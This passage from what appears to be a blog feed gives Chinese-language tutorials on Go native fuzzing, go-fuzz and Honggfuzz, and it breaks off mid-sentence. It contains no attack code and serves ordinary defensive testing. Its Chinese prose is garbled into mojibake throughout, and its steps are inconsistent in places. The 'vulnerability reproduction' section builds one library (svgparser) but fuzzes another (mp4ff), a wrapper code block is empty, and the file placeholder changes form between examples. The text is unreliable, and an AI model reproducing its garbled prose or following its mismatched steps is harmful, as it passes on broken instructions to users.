‡</li><li>æ‰€æœ‰ç§å­è¯­æ–™æ¡ç›®å¿…é¡»ä¸æ¨¡ç³Šå‚æ•°ç±»å‹å®Œå…¨åŒ¹é…ä¸”é¡ºåºä¸€è‡´ï¼ˆé€‚ç”¨äº<code>(*testing.F).Add</code>è°ƒç”¨å’Œtestdata&#x2F;fuzzç›®å½•ä¸­çš„è¯­æ–™æ–‡ä»¶ï¼‰</li></ol><p>é›¶é…ç½®ï¼šåªéœ€åœ¨æµ‹è¯•å‡½æ•°å‰æ·»åŠ <code>func FuzzXxx(f *testing.F)</code></p><p>è‡ªåŠ¨ç”Ÿæˆç§å­ï¼šåŸºäº<code>f.Add()</code>æä¾›çš„åˆå§‹è¾“å…¥è¿›è¡Œå˜å¼‚ã€‚</p><p>ä¸<code>go test</code>æ— ç¼é›†æˆï¼šæ”¯æŒå¹¶è¡Œæµ‹è¯•ã€è¦†ç›–ç‡æŠ¥å‘Šç­‰ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// å®˜æ–¹æ¨¡ç³Šæµ‹è¯•ç¤ºä¾‹</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FuzzParseURL</span><span class="hljs-params">(f *testing.F)</span></span> &#123;<br>    f.Add(<span class="hljs-string">&quot;https://example.com&quot;</span>) <span class="hljs-comment">// ç§å­è¾“å…¥</span><br>    f.Fuzz(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t *testing.T, s <span class="hljs-type">string</span>)</span></span> &#123;<br>        <span class="hljs-keyword">if</span> _, err := url.Parse(s); err != <span class="hljs-literal">nil</span> &#123;<br>            t.Skip() <span class="hljs-comment">// å¿½ç•¥æ— æ•ˆè¾“å…¥</span><br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>ç§å­è¯­æ–™åº“ï¼š</p><ul><li>ä½¿ç”¨ <code>f.Add()</code> æ·»åŠ åˆå§‹æµ‹è¯•ç”¨ä¾‹</li><li>è¿™äº›ç”¨ä¾‹ä¼šè¢«ä¿å­˜åˆ° <code>testdata/fuzz/FuzzTestName</code> ç›®å½•</li><li>åç»­è¿è¡Œä¼šè‡ªåŠ¨ä½¿ç”¨è¿™äº›ç”¨ä¾‹ä½œä¸ºèµ·ç‚¹</li></ul><h3 id="å¼€å§‹Fuzz"><a href="#å¼€å§‹Fuzz" class="headerlink" title="å¼€å§‹Fuzz"></a>å¼€å§‹Fuzz</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">è¿è¡Œæ¨¡ç³Šæµ‹è¯•ï¼ˆé»˜è®¤ä¼šæ— é™è¿è¡Œï¼‰</span><br>go test -fuzz=FuzzReverse<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">é™åˆ¶è¿è¡Œæ—¶é—´ï¼ˆ10ç§’ï¼‰</span><br>go test -fuzz=FuzzReverse -fuzztime=10s<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">åªè¿è¡Œç§å­è¯­æ–™åº“ä¸è¿›è¡Œæ¨¡ç³Šæµ‹è¯•</span><br>go test -run=FuzzReverse<br></code></pre></td></tr></table></figure><p>æœ‰ä¸¤ç§è¿è¡Œæ¨¡å¼ï¼š</p><ul><li>å•å…ƒæµ‹è¯•æ¨¡å¼ï¼ˆé»˜è®¤<code>go test</code>ï¼‰</li><li>æ¨¡ç³Šæµ‹è¯•æ¨¡å¼ï¼ˆ<code>go test -fuzz=FuzzTestName</code>ï¼‰</li></ul><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªç§å­è¯­æ–™æ¡ç›®éƒ½ä¼šä½œä¸ºå•å…ƒæµ‹è¯•æ‰§è¡Œã€‚å¯ç”¨æ¨¡ç³Šæµ‹è¯•åï¼ŒåŒ¹é…çš„æµ‹è¯•ä¼šæŒç»­è¿è¡Œç›´åˆ°å‘ç°é”™è¯¯ã€‚</p><p><img src="/Linux/assets/Pasted%20image%2020250601212322.png"></p><p>æˆ‘ä»¬çš„ä¸Šè¿° Fuzz ä¸­åœ¨å¤„ç†<code>\xde</code>å­—èŠ‚æ—¶å‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œ</p><h3 id="å¤±è´¥å¤„ç†"><a href="#å¤±è´¥å¤„ç†" class="headerlink" title="å¤±è´¥å¤„ç†"></a>å¤±è´¥å¤„ç†</h3><p>å½“å‡ºç°ä»¥ä¸‹æƒ…å†µä¼šè§¦å‘å¤±è´¥ï¼š</p><ol><li>ä»£ç æˆ–æµ‹è¯•å‘ç”Ÿpanic</li><li>è°ƒç”¨<code>t.Fail</code>ç­‰å¤±è´¥æ–¹æ³•</li><li>ä¸å¯æ¢å¤é”™è¯¯ï¼ˆå¦‚os.Exitï¼‰</li><li>æ‰§è¡Œè¶…æ—¶ï¼ˆé»˜è®¤1ç§’ï¼‰</li></ol><p>å¤±è´¥æ—¶ä¼šè‡ªåŠ¨æœ€å°åŒ–è¾“å…¥å¹¶ä¿å­˜åˆ°<code>testdata/fuzz/</code>ç›®å½•ï¼Œå¯ä½œä¸ºå›å½’æµ‹è¯•ç”¨ä¾‹ã€‚</p><h3 id="è‡ªå®šä¹‰è®¾ç½®"><a href="#è‡ªå®šä¹‰è®¾ç½®" class="headerlink" title="è‡ªå®šä¹‰è®¾ç½®"></a>è‡ªå®šä¹‰è®¾ç½®</h3><p>å¸¸ç”¨å‚æ•°ï¼š</p><ul><li><code>-fuzztime</code>ï¼šè¿è¡Œæ—¶é•¿&#x2F;æ¬¡æ•°ï¼ˆé»˜è®¤æ— é™ï¼‰</li><li><code>-fuzzminimizetime</code>ï¼šæœ€å°åŒ–å°è¯•æ—¶é•¿ï¼ˆé»˜è®¤60ç§’ï¼Œ0è¡¨ç¤ºç¦ç”¨ï¼‰</li><li><code>-parallel</code>ï¼šå¹¶è¡Œè¿›ç¨‹æ•°ï¼ˆé»˜è®¤GOMAXPROCSï¼‰</li></ul><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>å½“å‘ç°å´©æºƒæ—¶ï¼š</p><ul><li>æŸ¥çœ‹ <code>testdata/fuzz/FuzzTestName/</code> ä¸­çš„å´©æºƒç”¨ä¾‹</li><li>ä½¿ç”¨ <code>-run</code> å‚æ•°å•ç‹¬è¿è¡Œå´©æºƒç”¨ä¾‹ï¼š</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go test -run=FuzzReverse/058293736f23eabc<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨è°ƒè¯•å™¨åˆ†æ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dlv test -- -run=FuzzReverse/058293736f23eabc<br></code></pre></td></tr></table></figure><p>æ¨¡ç³Šæµ‹è¯•å‚æ•°ï¼š</p><ul><li><code>-fuzz</code>: æŒ‡å®šè¦è¿è¡Œçš„æ¨¡ç³Šæµ‹è¯•å‡½æ•°å</li><li><code>-fuzztime</code>: è®¾ç½®è¿è¡ŒæŒç»­æ—¶é—´ï¼ˆå¦‚ â€œ10sâ€ã€â€1hâ€ï¼‰</li><li><code>-fuzzminimizetime</code>: æœ€å°åŒ–å´©æºƒç”¨ä¾‹çš„æ—¶é—´ï¼ˆé»˜è®¤60ç§’ï¼‰</li><li><code>-parallel</code>: å¹¶è¡Œè¿è¡Œçš„æ¨¡ç³Šæµ‹è¯•æ•°é‡</li></ul><ol><li>ç›®å‰ä»…æ”¯æŒ <code>[]byte</code> å’Œ <code>string</code> ä½œä¸ºæ¨¡ç³Šæµ‹è¯•è¾“å…¥ç±»å‹</li><li>ç›¸æ¯”go-fuzzç¼ºå°‘ä¸€äº›é«˜çº§åŠŸèƒ½ï¼ˆå¦‚è‡ªå®šä¹‰å˜å¼‚ç­–ç•¥ï¼‰</li><li>æ€§èƒ½å¯èƒ½ä¸å¦‚ç¼–è¯‘ä¸ºäºŒè¿›åˆ¶çš„go-fuzz</li></ol><h2 id="go-fuzz"><a href="#go-fuzz" class="headerlink" title="go-fuzz"></a>go-fuzz</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ul><li>å®‰è£…å·¥å…·</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> install github.com/dvyukov/<span class="hljs-keyword">go</span>-fuzz/<span class="hljs-keyword">go</span>-fuzz@latest github.com/dvyukov/<span class="hljs-keyword">go</span>-fuzz/<span class="hljs-keyword">go</span>-fuzz-build@latest<br></code></pre></td></tr></table></figure><h3 id="åŸºç¡€å®ä¾‹"><a href="#åŸºç¡€å®ä¾‹" class="headerlink" title="åŸºç¡€å®ä¾‹"></a>åŸºç¡€å®ä¾‹</h3><p>æˆ‘ä»¬ä½¿ç”¨ go-fuzz é¦–å…ˆéœ€è¦ç¼–å†™ä»¥ä¸‹å½¢å¼çš„æµ‹è¯•å‡½æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fuzz</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> <span class="hljs-type">int</span><br></code></pre></td></tr></table></figure><p>å‚æ•°ï¼šå­—èŠ‚åˆ‡ç‰‡</p><p>è¿”å›å€¼è¯´æ˜ï¼š</p><ul><li><code>1</code>è¡¨ç¤ºåº”ä¼˜å…ˆè€ƒè™‘ç±»ä¼¼è¾“å…¥ã€‚</li><li><code>0</code>è¡¨ç¤ºä¸­æ€§ã€‚</li><li><code>-1</code>è¡¨ç¤ºä»è¯­æ–™åº“ä¸­æ’é™¤ã€‚</li></ul><p>å®˜æ–¹æ–‡æ¡£çš„ç¤ºä¾‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//æµ‹è¯•PNGåŒ…</span><br><span class="hljs-keyword">package</span> png<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;image/png&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fuzz</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>img, err := png.Decode(bytes.NewReader(data))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> img != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;è§£ç å‡ºé”™ä½†imgä¸ä¸ºnil&quot;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-keyword">var</span> w bytes.Buffer<br>err = png.Encode(&amp;w, img)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ„å»ºæµ‹è¯•ç¨‹åº</li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">go</span>-fuzz-build -o <span class="hljs-built_in">image</span>-fuzz.zip<br></code></pre></td></tr></table></figure><ul><li>æ„å»ºè¯­æ–™åº“</li></ul><p>æ„å»ºä¸€ä¸ªä¾› go-fuzz ä½¿ç”¨çš„è¯­æ–™åº“ï¼Œè¯­æ–™åº“å­˜æ”¾åœ¨å·¥ä½œç›®å½•ä¸‹ã€‚</p><blockquote><p>è¯­æ–™åº“ï¼š<a href="https://github.com/dvyukov/go-fuzz-corpus">dvyukov&#x2F;go-fuzz-corpusï¼šgithub.com&#x2F;dvyukov&#x2F;go-fuzz ç¤ºä¾‹çš„è¯­æ–™åº“</a></p></blockquote><ul><li>å¼€å§‹Fuzz</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">go-fuzz <span class="hljs-attribute">-bin</span>=image-fuzz.zip <span class="hljs-attribute">-workdir</span>=.<br></code></pre></td></tr></table></figure><ul><li>workers è¡¨ç¤ºå¹¶è¡Œè¿è¡Œçš„æµ‹è¯•æ•°ï¼ˆä½¿ç”¨ -procs æ ‡å¿—è®¾ç½®ï¼‰ã€‚</li><li>corpus æ˜¯æ¨¡ç³Šæµ‹è¯•ç¨‹åºå‘ç°çš„æœ‰è¶£è¾“å…¥çš„å½“å‰æ•°é‡ï¼Œæ‹¬å·ä¸­çš„æ—¶é—´è¡¨ç¤ºå‘ç°æœ€åä¸€ä¸ªæœ‰è¶£è¾“å…¥çš„æ—¶é—´</li><li>crashers æ˜¯å‘ç°çš„ bug çš„æ•°é‡ï¼ˆæŸ¥çœ‹ workdir&#x2F;crashers ç›®å½•ï¼‰ã€‚</li><li>restarts æ˜¯æ¨¡ç³Šæµ‹è¯•ç¨‹åºé‡æ–°å¯åŠ¨æµ‹è¯•è¿›ç¨‹çš„é€Ÿç‡ã€‚</li><li>cover æ˜¯åœ¨ç»è¿‡å“ˆå¸Œå¤„ç†çš„è¦†ç›–ç‡ä½å›¾ä¸­è®¾ç½®çš„ä½æ•°</li></ul><p>.quoted æ–‡ä»¶åŒ…å«ä»¥å­—ç¬¦ä¸²å½¢å¼å¼•ç”¨çš„è¾“å…¥ï¼Œ.output æ–‡ä»¶åŒ…å«æ•…éšœè½¬å‚¨</p><p>go-fuzzåˆæ­¥æ”¯æŒGo Modulesï¼Œä¼šéµå¾ª<code>GO111MODULE</code>ç¯å¢ƒå˜é‡è®¾ç½®ï¼š</p><ul><li><code>on</code>ï¼šå¯ç”¨æ¨¡å—</li><li><code>off</code>ï¼šç¦ç”¨æ¨¡å—</li><li><code>auto</code>ï¼šè‡ªåŠ¨åˆ¤æ–­</li></ul><h3 id="libFuzzer-é›†æˆ"><a href="#libFuzzer-é›†æˆ" class="headerlink" title="libFuzzer é›†æˆ"></a>libFuzzer é›†æˆ</h3><p>åœ¨ Linux  ç³»ç»Ÿä¸Šï¼Œgo-fuzzå¯ä»¥ç”Ÿæˆä¸ libFuzzer å…¼å®¹çš„å­˜æ¡£æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">go-fuzz-build -libfuzzer  # ç”Ÿæˆ.aæ–‡ä»¶<br>clang -fsanitize=fuzzer fmt.a -o fmt.libfuzzer<br>./fmt.libfuzzer<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æ„å»ºlibfuzzerç›®æ ‡</span><br>go-fuzz-build -libfuzzer -o fuzz.a .<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ä½¿ç”¨clangç¼–è¯‘</span><br>clang -fsanitize=fuzzer fuzz.a -o fuzz_binary<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è¿è¡Œæ¨¡ç³Šæµ‹è¯•</span><br>mkdir -p corpus<br>./fuzz_binary corpus<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æˆ–è€…æœ€å°åŒ–å¤ç°å´©æºƒ</span><br>./fuzz_binary -minimize_crash=1 -runs=100 crash_input<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ go-fuzz æ¥è¿›è¡Œ CVE æ¼æ´çš„å¤ç°ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span>-fuzz-build github.<span class="hljs-keyword">com</span>/JoshVarga/svgparser<br></code></pre></td></tr></table></figure><p>ç¼–å†™ Fuzz å‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> go_mp4_fuzz<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;github.com/Eyevinn/mp4ff/mp4&quot;</span><br>    <span class="hljs-string">&quot;bytes&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fuzz</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>    r := bytes.NewReader(data)<br>    _, err := mp4.DecodeFile(r)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ„å»º Fuzz ç¨‹åºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go-fuzz-build -o mp4fuzz.zip<br></code></pre></td></tr></table></figure><p>å¯åŠ¨ go-fuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go-fuzz -bin=mp4fuzz.zip -workdir=corpus<br></code></pre></td></tr></table></figure><ul><li>workers è¡¨ç¤ºå¹¶è¡Œè¿è¡Œçš„æµ‹è¯•æ•°ï¼ˆä½¿ç”¨ -procs æ ‡å¿—è®¾ç½®ï¼‰ã€‚</li><li>corpus æ˜¯æ¨¡ç³Šæµ‹è¯•ç¨‹åºå‘ç°çš„æœ‰è¶£è¾“å…¥çš„å½“å‰æ•°é‡ï¼Œæ‹¬å·ä¸­çš„æ—¶é—´è¡¨ç¤ºå‘ç°æœ€åä¸€ä¸ªæœ‰è¶£è¾“å…¥çš„æ—¶é—´</li><li>crashers æ˜¯å‘ç°çš„ bug çš„æ•°é‡ï¼ˆæŸ¥çœ‹ workdir&#x2F;crashers ç›®å½•ï¼‰ã€‚</li><li>restarts æ˜¯æ¨¡ç³Šæµ‹è¯•ç¨‹åºé‡æ–°å¯åŠ¨æµ‹è¯•è¿›ç¨‹çš„é€Ÿç‡ã€‚</li><li>cover æ˜¯åœ¨ç»è¿‡å“ˆå¸Œå¤„ç†çš„è¦†ç›–ç‡ä½å›¾ä¸­è®¾ç½®çš„ä½æ•°</li></ul><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://github.com/dvyukov/go-fuzz">dvyukov&#x2F;go-fuzzï¼šGo çš„éšæœºæµ‹è¯•</a><br><a href="https://snoopysecurity.github.io/posts/fuzzing-wit-go-fuzz/">ä½¿ç”¨ Go-Fuzz è¿›è¡Œæ¨¡ç³Šæµ‹è¯• |ğŸ’» |åšå®¢</a><br><a href="https://go.dev/doc/tutorial/fuzz">æ•™ç¨‹ï¼šæ¨¡ç³Šæµ‹è¯•å…¥é—¨ - Go ç¼–ç¨‹è¯­è¨€</a><br><a href="https://parsiya.net/blog/2018-05-05-learning-go-fuzz-2-goexif2/">Learning Go-Fuzz 2: goexif2</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Honggfuzzæµ…æ¢</title>
      <link href="/2025/07/01/fuzz/honggfuzz/"/>
      <url>/2025/07/01/fuzz/honggfuzz/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Honggfuzz æ˜¯ä¸€æ¬¾é«˜æ€§èƒ½ã€åŸºäºè¦†ç›–å¼•å¯¼ï¼ˆCoverage-guidedï¼‰çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œç”± Google å®‰å…¨å·¥ç¨‹å¸ˆå¼€å‘ï¼Œå¹¿æ³›åº”ç”¨äºæŒ–æ˜è½¯ä»¶ä¸­çš„å†…å­˜ç ´åã€é€»è¾‘æ¼æ´ç­‰å®‰å…¨é—®é¢˜ã€‚</p><p>å·¥ä½œåŸç†</p><ul><li>è¦†ç›–å¼•å¯¼ï¼šç›‘æ§ç›®æ ‡ç¨‹åºçš„ä»£ç è¦†ç›–ç‡ï¼ˆé€šè¿‡æ’æ¡©æˆ–ç¡¬ä»¶PTï¼‰ï¼Œä¼˜å…ˆä¿ç•™è§¦å‘æ–°è·¯å¾„çš„è¾“å…¥ã€‚</li><li>è¾“å…¥å˜å¼‚ï¼šåŸºäºé—ä¼ ç®—æ³•ï¼Œå¯¹åˆå§‹ç§å­æ–‡ä»¶è¿›è¡Œä½ç¿»è½¬ã€å—æ›¿æ¢ç­‰å˜å¼‚ã€‚</li><li>å¼‚å¸¸æ£€æµ‹ï¼šæ•è·å´©æºƒï¼ˆå¦‚SIGSEGVï¼‰ã€è¶…æ—¶æˆ–ç”¨æˆ·å®šä¹‰çš„å¼‚å¸¸è¡Œä¸ºã€‚</li></ul><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="ä¾èµ–å®‰è£…"><a href="#ä¾èµ–å®‰è£…" class="headerlink" title="ä¾èµ–å®‰è£…"></a>ä¾èµ–å®‰è£…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install -y build-essential git clang pkg-config \<br>libunwind-dev libblocksruntime-dev liblzma-dev \<br>    libncurses5-dev libtinfo-dev libcapstone-dev<br></code></pre></td></tr></table></figure><h3 id="ç¼–è¯‘ç›®æ ‡ç¨‹åº"><a href="#ç¼–è¯‘ç›®æ ‡ç¨‹åº" class="headerlink" title="ç¼–è¯‘ç›®æ ‡ç¨‹åº"></a>ç¼–è¯‘ç›®æ ‡ç¨‹åº</h3><ul><li>ä½¿ç”¨Sanitizersï¼š</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -fsanitize=address,undefined -fno-omit-frame-pointer -g -o target target.c<br></code></pre></td></tr></table></figure><ul><li>ç¡¬ä»¶PTæ¨¡å¼ï¼ˆéœ€Intel CPUï¼‰ï¼š</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz -e pt -- ./target ___FILE___<br></code></pre></td></tr></table></figure><h2 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><h3 id="æ–‡ä»¶è¾“å…¥æ¨¡å¼"><a href="#æ–‡ä»¶è¾“å…¥æ¨¡å¼" class="headerlink" title="æ–‡ä»¶è¾“å…¥æ¨¡å¼"></a>æ–‡ä»¶è¾“å…¥æ¨¡å¼</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">honggfuzz -i <span class="hljs-keyword">in</span> -o out -- ./target ___FILE___<br></code></pre></td></tr></table></figure><ul><li><code>-i</code>ï¼šåˆå§‹ç§å­ç›®å½•ã€‚  </li><li><code>-o</code>ï¼šå´©æºƒå’Œæ—¥å¿—è¾“å‡ºç›®å½•ã€‚  </li><li><code>___FILE___</code>ï¼šå ä½ç¬¦ï¼Œè¡¨ç¤ºè¾“å…¥æ–‡ä»¶è·¯å¾„ã€‚è¿™é‡Œçš„ä¸‹åˆ’çº¿æ˜¯3ä¸ªã€‚</li></ul><h3 id="æ ‡å‡†è¾“å…¥æ¨¡å¼"><a href="#æ ‡å‡†è¾“å…¥æ¨¡å¼" class="headerlink" title="æ ‡å‡†è¾“å…¥æ¨¡å¼"></a>æ ‡å‡†è¾“å…¥æ¨¡å¼</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">honggfuzz --stdin_input -- ./target &lt; ___FILE___<br></code></pre></td></tr></table></figure><h3 id="ç½‘ç»œæœåŠ¡Fuzz"><a href="#ç½‘ç»œæœåŠ¡Fuzz" class="headerlink" title="ç½‘ç»œæœåŠ¡Fuzz"></a>ç½‘ç»œæœåŠ¡Fuzz</h3><p>éœ€åŒ…è£…ç›®æ ‡ç¨‹åºï¼Œå°†è¾“å…¥é€šè¿‡Socketä¼ é€’ï¼š</p><ul><li>åŒ…è£…ç¨‹åº</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><ul><li>Fuzz</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz -- ./network_wrapper ___FILE___<br></code></pre></td></tr></table></figure><h2 id="é«˜çº§åŠŸèƒ½"><a href="#é«˜çº§åŠŸèƒ½" class="headerlink" title="é«˜çº§åŠŸèƒ½"></a>é«˜çº§åŠŸèƒ½</h2><h3 id="Linux-perf"><a href="#Linux-perf" class="headerlink" title="Linux perf"></a>Linux perf</h3><p>ä½¿ç”¨ Linux æ¥æé«˜ coverage ç²¾åº¦</p><h3 id="å¹¶å‘"><a href="#å¹¶å‘" class="headerlink" title="å¹¶å‘"></a>å¹¶å‘</h3><p>é€šè¿‡<code>-n</code>å‚æ•°å¯åŠ¨å¤šä¸ªå¹¶å‘ fuzzer å®ä¾‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz -i in -o out -n 4 -- ./target ___FILE___<br></code></pre></td></tr></table></figure><h3 id="å­—å…¸æ”¯æŒ"><a href="#å­—å…¸æ”¯æŒ" class="headerlink" title="å­—å…¸æ”¯æŒ"></a>å­—å…¸æ”¯æŒ</h3><p>é€šè¿‡<code>-x</code>å‚æ•°ä½¿ç”¨å­—å…¸è¿›è¡Œ Fuzzã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz -i in -o out -x dict.txt -- ./target ___FILE___<br></code></pre></td></tr></table></figure><h3 id="é—­æº"><a href="#é—­æº" class="headerlink" title="é—­æº"></a>é—­æº</h3><p>é€šè¿‡<code>--qemu-mode</code>è¿›è¡Œé»‘ç›’æ¨¡ç³Šæµ‹è¯•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz -i in -o out --qemu-mode -- ./target __FILE__<br></code></pre></td></tr></table></figure><h3 id="è‡ªå®šä¹‰å˜å¼‚ç­–ç•¥"><a href="#è‡ªå®šä¹‰å˜å¼‚ç­–ç•¥" class="headerlink" title="è‡ªå®šä¹‰å˜å¼‚ç­–ç•¥"></a>è‡ªå®šä¹‰å˜å¼‚ç­–ç•¥</h3><p>é€šè¿‡ 